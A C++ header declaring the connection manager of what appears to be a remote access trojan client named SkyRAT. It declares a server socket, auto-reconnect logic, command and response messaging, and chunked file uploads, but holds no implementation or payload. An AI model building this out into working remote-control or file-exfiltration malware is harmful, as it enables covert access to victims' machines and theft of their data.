#pragma once

#include <string>
#include <vector>
#include <memory>
#include <atomic>
#include <functional>
#include <chrono>
#include <map>
#include <winsock2.h>
#include <windows.h>
#pragma comment(lib, "ws2_32.lib")

// Forward declarations
namespace SkyRAT {
    namespace Core {
        class ConfigManager;
        class CommandDispatcher;
    }
    
    namespace Utils {
        class Logger;
    }
}

namespace Network {
    class MessageProtocol;
}

namespace SkyRAT {
namespace Core {

    /**
     * @brief Connection management and network communication
     * 
     * This class replaces all socket operations from legacy client.cpp
     * and provides proper connection lifecycle, error handling, and reconnection logic.
     */
    class ConnectionManager {
    public:
        enum class ConnectionState {
            Disconnected,
            Connecting,
            Connected,
            Reconnecting,
            Failed
        };

        using MessageHandler = std::function<void(const std::string&, SOCKET)>;

        ConnectionManager(std::shared_ptr<ConfigManager> configManager,
                         std::shared_ptr<Utils::Logger> logger);
        ~ConnectionManager();

        // Non-copyable and non-movable
        ConnectionManager(const ConnectionManager&) = delete;
        ConnectionManager& operator=(const ConnectionManager&) = delete;

        /**
         * @brief Initialize connection manager
         * @return true if initialization successful
         */
        bool initialize();

        /**
         * @brief Start connection manager and begin connection attempts
         */
        void start();

        /**
         * @brief Stop connection manager and close all connections
         */
        void stop();

        /**
         * @brief Get current connection state
         */
        ConnectionState getState() const;

        /**
         * @brief Check if currently connected
         */
        bool isConnected() const;

        /**
         * @brief Set message handler for incoming messages
         */
        void setMessageHandler(MessageHandler handler);

        /**
         * @brief Send message to server
         * @param message Message to send
         * @return true if sent successfully
         */
        bool sendMessage(const std::string& message);

        /**
         * @brief Send formatted message (with msgpack protocol)
         * @param message Message to send
         * @return true if sent successfully
         */
        bool sendFormattedMessage(const std::string& message);

        /**
         * @brief Send structured message with key-value pairs
         * @param data Key-value pairs to send
         * @return true if sent successfully
         */
        bool sendStructuredMessage(const std::map<std::string, std::string>& data);

        /**
         * @brief Send command message
         * @param command Command to execute
         * @param args Additional command arguments
         * @return true if sent successfully
         */
        bool sendCommand(const std::string& command, const std::map<std::string, std::string>& args = {});

        /**
         * @brief Send response message
         * @param response Response content
         * @param success Whether operation was successful
         * @return true if sent successfully
         */
        bool sendResponse(const std::string& response, bool success = true);

        /**
         * @brief Send error message
         * @param error Error description
         * @param errorCode Error code (optional)
         * @return true if sent successfully
         */
        bool sendError(const std::string& error, int errorCode = -1);

        /**
         * @brief Send file using automatic chunking for large files
         * @param filename Name of file to send
         * @param fileData File content as binary data
         * @return true if all messages sent successfully
         */
        bool sendFile(const std::string& filename, const std::vector<char>& fileData);

        /**
         * @brief Get connection statistics
         */
        struct ConnectionStats {
            std::chrono::steady_clock::time_point connectedSince;
            uint64_t messagesSent = 0;
            uint64_t messagesReceived = 0;
            uint64_t bytesSent = 0;
            uint64_t bytesReceived = 0;
            uint32_t reconnectAttempts = 0;
        };
        
        ConnectionStats getStats() const;

    private:
        // Dependencies
        std::shared_ptr<ConfigManager> m_configManager;
        std::shared_ptr<Utils::Logger> m_logger;
        std::unique_ptr<Network::MessageProtocol> m_messageProtocol;

        // Connection state
        std::atomic<ConnectionState> m_state;
        std::atomic<bool> m_running;
        std::atomic<bool> m_shouldReconnect;
        
        // Socket management
        SOCKET m_socket;
        std::string m_serverIP;
        uint16_t m_serverPort;
        int m_receiveBufferSize;
        
        // Reconnection logic
        bool m_autoReconnect;
        int m_reconnectInterval;
        int m_maxReconnectAttempts;
        std::atomic<uint32_t> m_reconnectAttempts;
        
        // Message handling
        MessageHandler m_messageHandler;
        
        // Statistics
        mutable ConnectionStats m_stats;

        // Private methods
        bool initializeSocketSubsystem();
        void cleanupSocketSubsystem();
        
        SOCKET createAndConnectSocket();
        void closeSocket();
        
        bool connectToServer();
        void disconnectFromServer();
        
        // Message protocol (from legacy create_message function)
        std::vector<char> createMessagePacket(const std::string& content);
        
        // Network operations
        bool sendRawData(const void* data, int size);
        int receiveData(char* buffer, int bufferSize);
        
        // Connection loop
        void connectionLoop();
        bool sendInitialGreeting();
        void handleIncomingMessages();
        
        // Reconnection logic
        void attemptReconnection();
        void resetReconnectionState();
        
        // Utility methods
        void setState(ConnectionState newState);
        void updateConnectionStats();
        std::string stateToString(ConnectionState state) const;
    };

} // namespace Core
} // namespace SkyRAT